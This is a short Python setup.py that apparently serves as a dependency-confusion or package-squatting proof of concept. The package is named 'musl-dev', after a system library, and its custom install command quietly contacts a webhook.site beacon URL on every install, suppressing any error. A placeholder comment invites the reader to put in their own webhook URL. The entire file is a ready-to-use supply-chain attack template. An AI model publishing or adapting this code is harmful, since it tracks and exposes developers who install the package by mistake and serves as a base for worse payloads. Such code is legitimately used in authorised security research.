from setuptools import setup
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/fbb7e93a-6609-4408-bf1f-439212f70d14"  # your webhook URL

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="musl-dev",
    version="1.0.0",
    packages=["musl-dev"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
